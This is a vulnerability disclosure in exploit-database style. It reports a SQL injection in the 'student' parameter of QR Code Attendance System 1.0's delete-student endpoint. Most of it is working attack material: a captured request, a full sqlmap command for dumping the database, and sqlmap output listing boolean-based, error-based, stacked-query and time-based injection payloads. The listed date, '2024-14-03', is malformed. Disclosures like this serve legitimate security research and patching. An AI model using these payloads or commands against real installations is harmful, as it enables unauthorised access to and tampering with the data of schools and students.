# QR Code Attendance System - SQL Injection -1
+ **Exploit Title:** QR Code Attendance System - SQL Injection -1
+ **Date:** 2024-14-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17242/qr-code-attendance-system-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17242&title=QR+Code+Attendance+System+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
QR Code Attendance System  1.0 allows SQL Injection via the 'student' parameter in "http://localhost/qr-code-attendance-system/endpoint/delete-student.php?student=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/qr-code-attendance-system/masterlist.php"
+ Select any student and press the delete-student button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /qr-code-attendance-system/endpoint/delete-student.php?student=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
```

+ Use sqlmap to exploit. In sqlmap, use 'student' parameter to dump the database.
```
sqlmap -r r.txt -p student --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: student (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: student=1' RLIKE (SELECT (CASE WHEN (1502=1502) THEN 1 ELSE 0x28 END))-- nKHR

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: student=1' AND EXTRACTVALUE(8135,CONCAT(0x5c,0x71787a7171,(SELECT (ELT(8135=8135,1))),0x716b6b6271))-- LcEp

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: student=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student=1' AND (SELECT 4221 FROM (SELECT(SLEEP(5)))mKvY)-- XUeE
---
[19:02:38] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
[19:02:39] [INFO] fetching current database
[19:02:39] [INFO] retrieved: 'qr_attendance_db'
current database: 'qr_attendance_db'
```
+ current database: `qr_attendance_db`

![Ekran görüntüsü 2024-03-14 020459](https://github.com/BurakSevben/CVEs/assets/117217689/08735a89-cad4-4f11-8cac-715652e72bd4)
